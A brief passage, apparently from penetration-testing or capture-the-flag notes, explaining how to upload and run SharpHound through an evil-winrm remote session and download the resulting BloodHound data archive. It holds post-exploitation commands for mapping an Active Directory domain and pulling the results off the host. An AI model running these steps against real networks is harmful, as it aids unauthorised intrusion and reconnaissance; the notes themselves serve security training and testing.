...
If we have `evil-winrm` session open, we can upload with `upload SharpHound.exe` and run with `.\SharpHound.exe -c All`, then download the zip file with `download <id>_BloodHound.zip`.
